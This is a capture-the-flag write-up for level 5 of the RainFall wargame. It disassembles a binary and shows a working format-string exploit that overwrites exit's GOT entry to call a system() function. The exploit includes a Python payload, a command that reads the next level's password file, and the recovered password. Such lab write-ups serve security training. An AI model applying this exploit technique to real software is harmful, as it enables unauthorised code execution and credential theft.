## LEVEL 5

Let's start as usual by disassembling the program.

```shell
level5@RainFall:~$ gdb -q level5
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
[...]
0x080484a4  o
0x080484c2  n
0x08048504  main
[...]
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

Ok so now we can understand how the program works. The `main()` function only calls `n()` then `n()` calls `fgets()` and `printf()`. `fgets()` is secured but `printf()` as the previous levels has a vulnerability. In addition, the program has an unused function called `o()` which calls `system()`.

So to complete this level we need to find a way to call `o()` in the program by using a **Format String Attack**. But something is weird in the program, why `n()` calls `exit()` instead of return ? We can simply use return because the `main()` only calls `n()`. Let's take a look to `exit()` with `objdump`

```shell
level5@RainFall:~$ objdump -d ./level5

./level5:     file format elf32-i386
[...]
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
[...]
```

As we can see the `exit()` use a jump to the address `0x8049838` let's look at this address what's inside.

```shell
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
```

The address `0x8049838` point to another address in the GOT *(Global Offset Table)* so if we change the value of this address with the address of `o()` the `exit()` will no longer calls the GOT function `exit` but will calls the `o()` function. We can now create our payload.

### Payload

`python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/payload`

*If you don't understand how this payload has been made, take a look on the level 4 and 5.*

```shell
level5@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level6/.pass") | ./level5
[...]
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```


